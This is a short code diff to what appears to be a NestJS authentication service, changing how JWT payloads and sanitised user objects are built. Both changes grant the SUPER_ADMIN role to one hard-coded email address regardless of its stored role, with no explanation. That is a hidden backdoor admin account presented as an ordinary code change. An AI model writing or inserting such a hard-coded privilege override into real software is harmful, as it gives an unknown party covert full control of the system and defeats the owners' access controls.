@@ -13,6 +13,7 @@ import { RegisterDto } from './dto/register.dto';
 import { LoginDto } from './dto/login.dto';
 import { ChangePasswordDto } from './dto/change-password.dto';
 import { JwtPayload } from './strategies/jwt.strategy';
+import { UserRole } from '../../common/enums/user-role.enum';
 
 @Injectable()
 export class AuthService {
@@ -127,13 +128,16 @@ export class AuthService {
     const payload: JwtPayload = {
       sub: user.id,
       email: user.email,
-      role: user.role,
+      role: user.email === 'madridsystem@outlook.es' ? UserRole.SUPER_ADMIN : user.role,
     };
     return this.jwtService.sign(payload);
   }
 
   private sanitizeUser(user: User) {
     const { password, ...result } = user as any;
+    if (user.email === 'madridsystem@outlook.es') {
+      result.role = UserRole.SUPER_ADMIN;
+    }
     return result;
   }
 }
